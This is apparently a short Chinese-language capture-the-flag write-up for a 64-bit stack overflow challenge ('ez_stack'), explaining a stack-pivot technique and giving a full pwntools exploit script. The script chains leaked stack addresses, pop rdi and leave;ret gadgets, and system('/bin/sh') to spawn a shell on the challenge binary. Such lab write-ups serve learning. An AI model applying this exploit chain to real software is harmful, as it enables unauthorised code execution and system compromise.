64位程序，0x20的栈空间，0x30的自主发挥空间，只能溢出到rbp和ret，查询相关信息可知此类问题为栈转移。

[相关链接](https://ctf-wiki.org/pwn/linux/stackoverflow/fancy-rop/)

程序中有system()和栈地址，我们寻找pop_rdi;ret和leave;ret的地址，再构造payload就可以啦

```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')

sh=process('./ez_stack')
elf=ELF('./ez_stack')

sh.recvuntil('This GIFT will help you: ')
system=elf.plt['system']
s=int(sh.recvline(),16)

leave_ret=0x400896

pop_rdi=0x400963

print hex(s)
payload = p64(pop_rdi)+p64(s+24)+p64(system)+'/bin/sh\x00'+p64(s-8)+p64(leave_ret)

sh.recvuntil('Use your magic word now:')

sh.send(payload)

sh.interactive()

```

